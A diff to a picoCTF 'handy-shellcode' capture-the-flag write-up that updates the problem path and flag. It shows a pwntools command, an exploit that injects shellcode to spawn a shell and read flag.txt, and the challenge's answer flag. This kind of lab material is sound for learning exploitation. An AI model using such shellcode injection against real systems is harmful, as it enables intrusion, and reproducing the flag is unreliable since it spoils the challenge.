@@ -1,7 +1,7 @@
 ## Using the pwntools template cli
 
 ```console
-pwn template --host 2019shell1.picoctf.com --user ${PICOUSER} --pass ${PICOPASS} --path /problems/handy-shellcode_0_24753fd2c78ac1a60682f0c924b23405/vuln
+pwn template --host 2019shell1.picoctf.com --user ${PICOUSER} --pass ${PICOPASS} --path /problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5/vuln
 ```
 
 ### Mods in the end of the exploit.py generated
@@ -21,11 +21,11 @@ io = start()
 
 io.sendlineafter(':\n', asm(shellcraft.i386.linux.sh()))
 io.sendlineafter(
-    '$ ', 'cat /problems/handy-shellcode_0_24753fd2c78ac1a60682f0c924b23405/flag.txt')
+    '$ ', 'cat /problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5/flag.txt')
 
 io.close()
 ```
 
 ## Flag
 
-picoCTF{h4ndY_d4ndY_sh311c0d3_ce07e7f1}
+picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}
